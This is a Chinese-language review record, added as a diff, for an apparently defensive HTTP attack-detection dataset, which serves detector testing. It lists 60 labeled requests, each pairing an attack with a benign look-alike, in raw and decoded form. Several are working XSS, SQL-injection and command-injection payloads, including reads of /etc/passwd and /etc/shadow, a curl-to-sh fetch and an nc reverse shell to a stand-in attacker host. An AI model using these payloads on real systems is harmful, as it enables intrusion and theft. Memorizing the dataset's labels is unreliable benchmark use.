@@ -1,0 +1,327 @@
+AegisForge 人工复核证据 04：HTTP 请求位置、编码与解码核对
+复核人：visibywang    复核日期：2026-11-12    材料版本：69cf069
+====================================================================
+说明：
+1. 行号为该请求在 bundle 文件中的行号（请求行/头/体所在行），不是样例内行号。
+2. "解码"只做离线还原：URL 一次/二次解码、JSON 解析、base64 解码；未访问任何地址、
+   未发送请求、未对真实站点做任何测试。
+3. 判断只针对"请求是否携带该类攻击特征"，不据此断言服务端存在漏洞。
+4. 结论均为 agree（A=attack、N=normal），逐条理由见《样例复核记录.txt》第七、八节；
+   本表提供可复核的原文与解码值。
+
+一、开发集（samples/dev/http/requests.bundle.txt）
+--------------------------------------------------------------------
+[HTTP-XSS-01-A] 第6行 GET /search?q=... 查询参数 q
+原文：q=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+解码：URL 一次 → <script>alert(document.domain)</script>
+判断：完整 script 标签，反射型 XSS 特征。A/CWE-79 成立。
+
+[HTTP-XSS-01-N] 第12行 GET /search?q=...
+原文：q=I+%3C3+handmade+mugs
+解码：URL（+→空格）→ I <3 handmade mugs
+判断：仅"<3"表情文本，无标签结构。N 成立。
+
+[HTTP-XSS-02-A] 第22行 POST /api/profile JSON 体 display_name
+原文：{"display_name": "<img src=x onerror=alert(1)>", "bio": "hello"}
+解码：JSON 解析 → display_name = <img src=x onerror=alert(1)>
+判断：事件处理器型 XSS 特征。A/CWE-79 成立。
+
+[HTTP-XSS-02-N] 第29行 POST /api/profile JSON
+原文：{"display_name":"Ada","bio":"Uploaded avatar image.png; see the img folder"}
+解码：JSON 解析 → 普通文本，含 img 单词与分号
+判断：无标签/事件处理器。N 成立。
+
+[HTTP-XSS-03-A] 第36行 POST /feedback 表单 message
+原文：message=%253Csvg%2520onload%253Dalert%25281%2529%253E
+解码：URL 两次 → <svg onload=alert(1)>
+判断：二次编码绕过；解码后是 SVG onload。A/CWE-79 成立（编码层 url_twice 与 family 一致）。
+
+[HTTP-XSS-03-N] 第43行 POST /feedback 表单 message
+原文：message=Tom+%26+Jerry+%3D+classic%3B+100%25+agree
+解码：URL → Tom & Jerry = classic; 100% agree
+判断：编码标点，无 HTML 结构。N 成立。
+
+[HTTP-XSS-04-A] 第46行 GET /login?next=... 查询参数 next
+原文：next=javascript%3Aalert(document.cookie)
+解码：URL → javascript:alert(document.cookie)
+判断：javascript: 方案 + 脚本，XSS/跳转特征。A/CWE-79 成立。
+
+[HTTP-XSS-04-N] 第51行 GET /login?next=...
+原文：next=%2Faccount%2Fsettings%3Ftab%3Dsecurity
+解码：URL → /account/settings?tab=security
+判断：站内相对跳转。N 成立。
+
+[HTTP-SQLI-01-A] 第56行 GET /products?category=... 查询参数 category
+原文：category=1%20UNION%20SELECT%20username,password_hash%20FROM%20users--
+解码：URL → 1 UNION SELECT username,password_hash FROM users--
+判断：UNION 联合查询 + 注释截断。A/CWE-89 成立。
+
+[HTTP-SQLI-01-N] 第61行 GET /products?category=travel&q=...
+原文：q=union+station+tote+bag
+解码：URL → union station tote bag
+判断：SQL 关键词作普通名词，无 SELECT/注释。N 成立。
+
+[HTTP-SQLI-02-A] 第70行 POST /login 表单 password
+原文：password=%27+or+%271%27%3D%271
+解码：URL → ' or '1'='1
+判断：恒真登录绕过。A/CWE-89 成立。
+
+[HTTP-SQLI-02-N] 第77行 POST /login 表单 password
+原文：password=O%27Neil-2024%21
+解码：URL → O'Neil-2024!
+判断：姓名中的单引号 + 普通密码。N 成立。
+
+[HTTP-SQLI-03-A] 第84行 POST /api/orders/lookup JSON order_id
+原文：{"order_id": "1001 AND SLEEP(5)", "email": "a@example.test"}
+解码：JSON → order_id = 1001 AND SLEEP(5)
+判断：时间盲注函数调用。A/CWE-89 成立。
+
+[HTTP-SQLI-03-N] 第91行 POST /api/orders/lookup JSON
+原文：{"order_id":"1001","note":"Please deliver after 6pm, I need to sleep in."}
+解码：JSON → 备注含 sleep 单词
+判断：无函数调用/运算符。N 成立。
+
+[HTTP-SQLI-04-A] 第96行 GET /dashboard Cookie
+原文：Cookie: theme=dark; tracking_id=42' AND '1'='1
+解码：Cookie 原值 → tracking_id = 42' AND '1'='1
+判断：布尔盲注（AND 恒真）。A/CWE-89 成立。
+
+[HTTP-SQLI-04-N] 第102行 GET /dashboard Cookie
+原文：Cookie: theme=dark; tracking_id=42; lang=en-GB
+解码：三个普通键值
+判断：无引号/运算符。N 成立。
+
+[HTTP-CMDI-01-A] 第106行 GET /tools/ping 查询参数 host
+原文：host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd
+解码：URL → 127.0.0.1;cat /etc/passwd
+判断：分号连接命令并读取敏感文件。A/CWE-78 成立。
+
+[HTTP-CMDI-01-N] 第111行 GET /tools/ping 查询参数 host
+原文：host=db-replica-2.internal.example.test
+解码：普通主机名
+判断：无分隔符。N 成立。
+
+[HTTP-CMDI-02-A] 第120行 POST /reports/export 表单 name
+原文：name=q3-report%24%28whoami%29&format=pdf
+解码：URL → name=q3-report$(whoami)
+判断：$() 命令替换。A/CWE-78 成立。
+
+[HTTP-CMDI-02-N] 第127行 POST /reports/export 表单
+原文：name=q3-report&format=pdf&note=Budget+%2410k+approved
+解码：URL → note = Budget $10k approved
+判断：$ 为金额符号，无 $()。N 成立。
+
+[HTTP-CMDI-03-A] 第134行 POST /api/hooks JSON branch
+原文：{"branch": "main`curl http://attacker.example.test/x.sh|sh`", "notify": true}
+解码：JSON → branch = main`curl http://attacker.example.test/x.sh|sh`
+判断：反引号执行 + 管道给 sh。A/CWE-78 成立。
+
+[HTTP-CMDI-03-N] 第141行 POST /api/hooks JSON
+原文：{"branch":"main","notify":true,"comment":"Run `npm install` before building"}
+解码：JSON → comment 含 Markdown 反引号
+判断：正常构建说明。N 成立（依赖 comment 不被 shell 解释）。
+
+[HTTP-CMDI-04-A] 第146行 GET /status 请求头 User-Agent
+原文：User-Agent: monitor/1.0 && id
+解码：无编码
+判断：&& 条件连接 + id。A/CWE-78 成立。
+
+[HTTP-CMDI-04-N] 第152行 GET /status 请求头 User-Agent
+原文：User-Agent: monitor/1.0 (compatible; uptime-check)
+解码：无编码
+判断：UA 注释语法，无命令连接。N 成立。
+
+二、原保留集（samples/holdout/http/requests.bundle.txt）
+--------------------------------------------------------------------
+[HTTP-XSS-05-A] 第6行 GET /blog/<path> 路径段
+原文：/blog/%3Csvg%20onload%3Dalert(1)%3E
+解码：URL → <svg onload=alert(1)>
+判断：SVG 事件处理器，路径反射 XSS 特征。A/CWE-79 成立。
+
+[HTTP-XSS-05-N] 第11行 GET /blog/<path>
+原文：/blog/2026-11-05-release-notes
+解码：普通 slug
+判断：无标签。N 成立。
+
+[HTTP-XSS-06-A] 第18行 GET /help 请求头 Referer
+原文：https://partner.example.test/"><img src=x onerror=alert(document.cookie)>
+解码：无编码（原样）
+判断：引号闭合 + img onerror。A/CWE-79 成立。
+
+[HTTP-XSS-06-N] 第24行 GET /help 请求头 Referer
+原文：https://partner.example.test/docs/getting-started?ref=nav
+解码：普通 URL
+判断：无脚本/闭合。N 成立。
+
+[HTTP-XSS-07-A] 第32行 POST /api/widgets JSON widget.style.color
+原文："color": "red\" autofocus onfocus=\"alert(1)"
+解码：JSON → red" autofocus onfocus="alert(1)
+判断：属性闭合 + 事件处理器。A/CWE-79 成立。
+
+[HTTP-XSS-07-N] 第39行 POST /api/widgets JSON
+原文：title = The \"Q3\" sales chart；color = #c0392b
+解码：JSON → 普通带引号文本 + 十六进制颜色
+判断：无属性闭合结构。N 成立。
+
+[HTTP-XSS-08-A] 第42行 GET /search?q=...
+原文：q=%3CScRiPt%3Ealert%28origin%29%3C%2FsCrIpT%3E
+解码：URL → <ScRiPt>alert(origin)</sCrIpT>
+判断：大小写混合 script 标签。A/CWE-79 成立。
+
+[HTTP-XSS-08-N] 第47行 GET /search?q=...
+原文：q=for+x+in+range%2810%29%3A+print%28x%29
+解码：URL → for x in range(10): print(x)
+判断：代码片段，无标签。N 成立。
+
+[HTTP-XSS-09-A] 第56行 POST /posts 表单 body
+原文：body=%3Ciframe+srcdoc%3D%22%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B%22%3E%3C%2Fiframe%3E
+解码：URL → <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
+判断：srcdoc 内的实体脚本会在 iframe 中执行。A/CWE-79 成立。
+
+[HTTP-XSS-09-N] 第63行 POST /posts 表单
+原文：title=Embedding+videos&body=Use+the+iframe+embed+code+from+the+video+page.
+解码：URL → 普通文本，含 iframe 单词
+判断：无 < > / srcdoc 结构。N 成立。
+
+[HTTP-XSS-10-A] 第66行 GET /out?to=... 查询参数 to
+原文：to=data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D
+解码：URL → data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==；
+base64 → <script>alert(1)</script>
+判断：data:text/html + 脚本，XSS 特征。A/CWE-79 成立。
+
+[HTTP-XSS-10-N] 第71行 GET /out?to=...
+原文：to=https%3A%2F%2Fdocs.example.test%2Fguide
+解码：URL → https://docs.example.test/guide
+判断：普通绝对 https 跳转。N 成立。
+
+[HTTP-SQLI-05-A] 第76行 GET /orders?id=... 查询参数 id
+原文：id=7%3B%20DROP%20TABLE%20orders--
+解码：URL → 7; DROP TABLE orders--
+判断：堆叠 DROP 语句。A/CWE-89 成立（是否可执行取决于驱动）。
+
+[HTTP-SQLI-05-N] 第81行 GET /notes?q=...
+原文：q=milk%3B+eggs%3B+bread
+解码：URL → milk; eggs; bread
+判断：分号作列表分隔，无 SQL 语句。N 成立。
+
+[HTTP-SQLI-06-A] 第90行 POST /login 表单 username
+原文：username=admin%27--&password=anything
+解码：URL → username = admin'--；password = anything
+判断：注释截断登录条件。A/CWE-89 成立。
+
+[HTTP-SQLI-06-N] 第97行 POST /login 表单
+原文：username=j.doe&password=Lake--Shore-77
+解码：URL → password = Lake--Shore-77
+判断：密码中的双连字符，无 SQL 结构。N 成立。
+
+[HTTP-SQLI-07-A] 第104行 POST /api/accounts/balance JSON account_id
+原文：{"account_id": "1 OR 1=1"}
+解码：JSON → 1 OR 1=1
+判断：未加引号数值上下文恒真。A/CWE-89 成立（取决于服务端是否加引号）。
+
+[HTTP-SQLI-07-N] 第111行 POST /api/accounts/balance JSON
+原文：{"account_id":"1042","memo":"split 3 = 1 + 2 between us"}
+解码：JSON → 普通数字 + 自然语言算式
+判断：无 OR/UNION/注释。N 成立。
+
+[HTTP-SQLI-08-A] 第114行 GET /products?sort=... 查询参数 sort
+原文：sort=(SELECT%20CASE%20WHEN%20(1%3D1)%20THEN%20price%20ELSE%20name%20END)
+解码：URL → (SELECT CASE WHEN (1=1) THEN price ELSE name END)
+判断：ORDER BY 子查询/布尔盲注。A/CWE-89 成立。
+
+[HTTP-SQLI-08-N] 第119行 GET /products?sort=...
+原文：sort=price,-created_at
+解码：普通多列排序
+判断：无子查询。N 成立。
+
+[HTTP-SQLI-09-A] 第126行 GET /api/me 请求头 X-Forwarded-For
+原文：X-Forwarded-For: 1' AND extractvalue(1,concat(0x7e,version()))-- -
+解码：无编码
+判断：报错注入函数 + 注释。A/CWE-89 成立。
+
+[HTTP-SQLI-09-N] 第132行 GET /api/me 请求头 X-Forwarded-For
+原文：X-Forwarded-For: 203.0.113.7, 198.51.100.2
+解码：普通文档用 IP 列表
+判断：无引号/函数。N 成立。
+
+[HTTP-SQLI-10-A] 第136行 GET /items/<path> 路径段
+原文：/items/0%20UNION%20SELECT%200x61646d696e,0x70617373
+解码：URL → /items/0 UNION SELECT 0x61646d696e,0x70617373；
+0x61646d696e=admin，0x70617373=pass
+判断：UNION + 十六进制字面量。A/CWE-89 成立。
+
+[HTTP-SQLI-10-N] 第141行 GET /items/<path>
+原文：/items/0x7f3a9c
+解码：普通十六进制标识符
+判断：无 SQL 关键字/空格。N 成立。
+
+[HTTP-CMDI-05-A] 第146行 GET /tools/nslookup?domain=... 查询参数 domain
+原文：domain=example.test%0Aid
+解码：URL → example.test\nid
+判断：换行命令分隔。A/CWE-78 成立。
+
+[HTTP-CMDI-05-N] 第151行 GET /feedback?comment=... 查询参数 comment
+原文：comment=Line+one%0ALine+two
+解码：URL → Line one\nLine two
+判断：多行普通文本。N 成立。
+
+[HTTP-CMDI-06-A] 第160行 POST /tools/archive 表单 path
+原文：path=%2Ftmp%2Fmissing+%7C%7C+cat+%2Fetc%2Fshadow
+解码：URL → /tmp/missing || cat /etc/shadow
+判断：|| 逻辑或连接 + 读取 shadow。A/CWE-78 成立。
+
+[HTTP-CMDI-06-N] 第167行 POST /tools/archive 表单
+原文：path=%2Fsrv%2Fdata&note=keep+daily+%7C%7C+weekly
+解码：URL → path=/srv/data；note=keep daily || weekly
+判断：|| 作自然语言"或"。N 成立。
+
+[HTTP-CMDI-07-A] 第174行 POST /api/convert JSON file
+原文：{"file": "a.png;cat${IFS}/etc/passwd"}
+解码：JSON → a.png;cat${IFS}/etc/passwd
+判断：分号 + IFS 空白规避 + 读取敏感文件。A/CWE-78 成立。
+
+[HTTP-CMDI-07-N] 第181行 POST /api/convert JSON
+原文：{"file":"report.png","note":"use ${HOME}/exports as target"}
+解码：JSON → 普通文件名 + 说明中的 shell 变量
+判断：无命令/分隔符。N 成立。
+
+[HTTP-CMDI-08-A] 第188行 POST /api/diagnostics text/plain 体
+原文：host=10.0.0.5 & ping -n 30 127.0.0.1
+解码：无编码
+判断：Windows & 分隔 + ping 延时。A/CWE-78 成立。
+
+[HTTP-CMDI-08-N] 第195行 POST /api/diagnostics text/plain 体
+原文：Status update: database & cache are healthy.
+解码：无编码
+判断：& 作英语连词。N 成立。
+
+[HTTP-CMDI-09-A] 第200行 GET /api/version 请求头 X-Client-Version
+原文：2.4.1 | nc attacker.example.test 4444 -e /bin/sh
+解码：无编码
+判断：管道 + 反弹 shell。A/CWE-78 成立。
+
+[HTTP-CMDI-09-N] 第206行 GET /api/version 请求头 X-Client-Version
+原文：2.4.1|build-8812
+解码：无编码
+判断：版本/构建号分隔。N 成立。
+
+[HTTP-CMDI-10-A] 第210行 GET /tools/ping?host=... 查询参数 host
+原文：host=127.0.0.1%3Bw%27h%27o%27a%27mi
+解码：URL → 127.0.0.1;w'h'o'a'mi（shell 拼接后为 whoami）
+判断：分号 + 引号拆分命令名。A/CWE-78 成立。
+
+[HTTP-CMDI-10-N] 第215行 GET /files?path=... 查询参数 path
+原文：path=C%3A%5CUsers%5CPublic%5Creport.txt
+解码：URL → C:\Users\Public\report.txt
+判断：普通 Windows 路径。N 成立。
+
+三、附注
+--------------------------------------------------------------------
+1. 上表 60 条与 manifest 的 cwe/anchor 一一对应；N 样本的 cwe 为 null，表示正常对照无类别，
+   不是漏标。
+2. 二次编码（HTTP-XSS-03-A）与 base64（HTTP-XSS-10-A）都给出了中间解码值，避免把"编码后的
+   文本"误当普通文本，也避免只看编码形式就判攻击。
+3. 正常样本中的 <3、union、sleep、双连字符、$ 金额、Markdown 反引号、||、& 连词、管道版本号、
+   Windows 路径都是刻意设计的"相似字符/关键词但非攻击"对照；本表说明它们为什么仍属正常。
+4. 副本中未出现真实域名/IP；Host 使用 .test 保留域，SQLI-09-N 使用 203.0.113.0/24 与
+   198.51.100.0/24 文档段。本次未发出任何请求。
